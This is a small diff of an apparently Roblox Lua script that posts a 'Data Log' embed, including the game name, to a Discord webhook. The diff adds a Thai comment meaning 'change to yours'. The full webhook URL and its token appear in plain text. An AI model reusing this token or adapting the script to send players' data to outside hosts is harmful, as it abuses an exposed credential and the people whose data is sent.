@@ -1,4 +1,4 @@
-local url = "https://discord.com/api/webhooks/1371024170581889054/ZnDO1c5wO05anqIg3bPkb_X9rp9zJNdpsKZIjQaDuerSXh8ahLu7SrAxVwQCjwUQXyn6"
+local url = "https://discord.com/api/webhooks/1371024170581889054/ZnDO1c5wO05anqIg3bPkb_X9rp9zJNdpsKZIjQaDuerSXh8ahLu7SrAxVwQCjwUQXyn6" -- เปลี่ยนเป็นของคุณ
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -14,7 +14,6 @@ end)
 local gameName = success and info.Name or "Unknown"
 
 local data = {
-    content = nil,
     embeds = {
         {
             title = "📦 Data Log",
